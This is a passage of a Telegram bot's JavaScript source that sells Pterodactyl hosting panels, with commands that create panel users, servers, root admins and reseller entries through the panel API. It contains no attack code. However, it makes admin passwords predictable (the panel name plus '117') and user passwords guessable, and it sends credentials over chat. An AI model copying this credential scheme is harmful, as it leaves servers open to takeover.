        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${msg.from.username} Panel kamu berhasil dibuat

<b>Berikut adalah detail akun anda:</b>

• Username : <code>${user.username}<code>
• Password : <code>${password}<code> 

• ID : ${user.id}
• NAMA : ${username}
• EMAIL : ${email}
• RAM : 6gb

<blockquote>Note: Silahkan login dan ganti password anda demi keamanan. Jangan berikan detail akun ini kepada siapapun!</blockquote>
`,
 parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🌐 Login", url: domain },
        { text: "🔑 Salin Password", switch_inline_query_current_chat: password }
      ],
    ],
  },
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 7gb
bot.onText(/\/7gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_CPANEL;
  if (shouldIgnoreMessage(msg)) return;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /7gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "7gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "7048";
  const cpu = "200";
  const disk = "7048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = username+Math.random().toString(36).slice(2,5);
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${msg.from.username} Panel kamu berhasil dibuat

<b>Berikut adalah detail akun anda:</b>

• Username : <code>${user.username}<code>
• Password : <code>${password}<code> 

• ID : ${user.id}
• NAMA : ${username}
• EMAIL : ${email}
• RAM : 7gb

<blockquote>Note: Silahkan login dan ganti password anda demi keamanan. Jangan berikan detail akun ini kepada siapapun!</blockquote>
`,
 parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🌐 Login", url: domain },
        { text: "🔑 Salin Password", switch_inline_query_current_chat: password }
      ],
    ],
  },
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 8gb
bot.onText(/\/8gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_CPANEL;
  if (shouldIgnoreMessage(msg)) return;
  
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /8gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "8gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "8048";
  const cpu = "230";
  const disk = "8048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = username+Math.random().toString(36).slice(2,5);
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${msg.from.username} Panel kamu berhasil dibuat

<b>Berikut adalah detail akun anda:</b>

• Username : <code>${user.username}<code>
• Password : <code>${password}<code> 

• ID : ${user.id}
• NAMA : ${username}
• EMAIL : ${email}
• RAM : 8gb

<blockquote>Note: Silahkan login dan ganti password anda demi keamanan. Jangan berikan detail akun ini kepada siapapun!</blockquote>
`,
 parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🌐 Login", url: domain },
        { text: "🔑 Salin Password", switch_inline_query_current_chat: password }
      ],
    ],
  },
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 9gb
bot.onText(/\/9gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_CPANEL;
  if (shouldIgnoreMessage(msg)) return;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /9gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "9gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "9048";
  const cpu = "260";
  const disk = "9048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = username+Math.random().toString(36).slice(2,5);
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${msg.from.username} Panel kamu berhasil dibuat

<b>Berikut adalah detail akun anda:</b>

• Username : <code>${user.username}<code>
• Password : <code>${password}<code> 

• ID : ${user.id}
• NAMA : ${username}
• EMAIL : ${email}
• RAM : 9gb

<blockquote>Note: Silahkan login dan ganti password anda demi keamanan. Jangan berikan detail akun ini kepada siapapun!</blockquote>
`,
 parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🌐 Login", url: domain },
        { text: "🔑 Salin Password", switch_inline_query_current_chat: password }
      ],
    ],
  },
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 10gb
bot.onText(/\/10gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_CPANEL;
  if (shouldIgnoreMessage(msg)) return;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /10gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "10gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "10000";
  const cpu = "290";
  const disk = "10000";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = username+Math.random().toString(36).slice(2,5);
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${msg.from.username} Panel kamu berhasil dibuat

<b>Berikut adalah detail akun anda:</b>

• Username : <code>${user.username}<code>
• Password : <code>${password}<code> 

• ID : ${user.id}
• NAMA : ${username}
• EMAIL : ${email}
• RAM : 10gb

<blockquote>Note: Silahkan login dan ganti password anda demi keamanan. Jangan berikan detail akun ini kepada siapapun!</blockquote>
`,
 parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🌐 Login", url: domain },
        { text: "🔑 Salin Password", switch_inline_query_current_chat: password }
      ],
    ],
  },
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});

// unli
bot.onText(/\/unli (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_CPANEL;
  if (shouldIgnoreMessage(msg)) return;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /unli namapanel,idtele");
    return;
  }
  const username = t[0]; 
  const u = t[1];
  const name = username + "unli";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "0";
  const cpu = "0";
  const disk = "0";
  const email = `${username}@unli.X-INCRASH`;
  const akunlo = randomImage;
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const password = username+Math.random().toString(36).slice(2,5);
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${msg.from.username} Panel kamu berhasil dibuat

<b>Berikut adalah detail akun anda:</b>

• Username : <code>${user.username}<code>
• Password : <code>${password}<code> 

• ID : ${user.id}
• NAMA : ${username}
• EMAIL : ${email}
• RAM : Unlimited

<blockquote>Note: Silahkan login dan ganti password anda demi keamanan. Jangan berikan detail akun ini kepada siapapun!</blockquote>
`,
 parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🌐 Login", url: domain },
        { text: "🔑 Salin Password", switch_inline_query_current_chat: password }
      ],
    ],
  },
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// paneladmin
bot.onText(/\/cadp (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return;

  if (!isOwner(senderId) && !isAdp(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const commandParams = match[1].split(",");
  const panelName = commandParams[0].trim();
  const telegramId = commandParams[1].trim();
  if (commandParams.length < 2) {
    bot.sendMessage(
      chatId,
      "Format Salah! Penggunaan: /cadp namapanel,idtele"
    );
    return;
  }
  const password = panelName + "117";
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: `${panelName}@admin.id`,
        username: panelName,
        first_name: panelName,
        last_name: "Memb",
        language: "en",
        root_admin: true,
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      bot.sendMessage(chatId, JSON.stringify(data.errors[0], null, 2));
      return;
    }
    const user = data.attributes;
    const userInfo = `
❏「 DONE CREATE ADMIN PANEL 」❏
    `;
     bot.sendMessage(chatId, userInfo);
    bot.sendMessage(
      telegramId,
`
┏━⬣❏「 INFO DATA ADMIN PANEL 」❏
┃• 友 ID : ${user.id}
┃• 好 Email : ${user.email}
┃• 好 Login : ${domain}
┃• 好 Username : ${user.username}
┃• 好 Password : ${password}
┗━━━━━━━━━⬣
┃ Rules : 
║• Jangan Curi Sc
┃• Jangan Buka Panel Orang
║• Jangan Ddos Server
┃• Kalo jualan sensor domainnya
║• Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
  } catch (error) {
    console.error(error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan dalam pembuatan admin. Silakan coba lagi nanti."
    );
  }
});
  
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// listsrv
bot.onText(/\/listsrv/, async (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
     if (shouldIgnoreMessage(msg)) return;

  if (!isOwner(senderId) && !isAdp(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }

  let page = 1; // Mengubah penggunaan args[0] yang tidak didefinisikan sebelumnya
  try {
    let f = await fetch(`${domain}/api/application/servers?page=${page}`, {
      // Menggunakan backticks untuk string literal
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });
    let res = await f.json();
    let servers = res.data;
    let messageText = "Daftar server aktif yang dimiliki:\n\n";
    for (let server of servers) {
      let s = server.attributes;

      let f3 = await fetch(
        `${domain}/api/client/servers/${s.uuid.split("-")[0]}/resources`,
        {
          method: "GET",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: `Bearer ${pltc}`,
          },
        }
      );
      let data = await f3.json();
      let status = data.attributes ? data.attributes.current_state : s.status;

      messageText += `ID Server: ${s.id}\n`;
      messageText += `Nama Server: ${s.name}\n`;
      messageText += `Status: ${status}\n\n`;
    }

    bot.sendMessage(chatId, messageText);
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "Terjadi kesalahan dalam memproses permintaan.");
  }
});

//Addakses Cpanel
bot.onText(/\/addres (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const newResId = parseInt(match[1]);
  if (shouldIgnoreMessage(msg)) return;

  if (!isOwner(userId) && !isAdp(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  if (isNaN(newResId)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const resellerData = loadResellers();
  if (resellerData.resellers.includes(newResId)) return bot.sendMessage(chatId, `⚠️ID ${newResId} Sudah Ada Di Reseller!`);

  resellerData.resellers.push(newResId);
  saveResellers(resellerData);
  bot.sendMessage(chatId, `✅ ID ${newResId} Berhasil Di TambahKan Menjadi Reseller`);
});

bot.onText(/\/listreseller/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return;
    
  if (!isOwner(userId) && !isAdp(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }

  const resellers = loadResellers().resellers || [];
  bot.sendMessage(chatId, `👥 **Daftar Reseller:**\n\n${resellers.map((r, i) => `${i + 1}. ${r}`).join("\n") || "🚫 Tidak ada reseller!"}`, { parse_mode: "Markdown" });
});

bot.onText(/\/delres (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const resToRemove = parseInt(match[1]);
  if (shouldIgnoreMessage(msg)) return;

  if (!isOwner(userId) && !isAdp(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
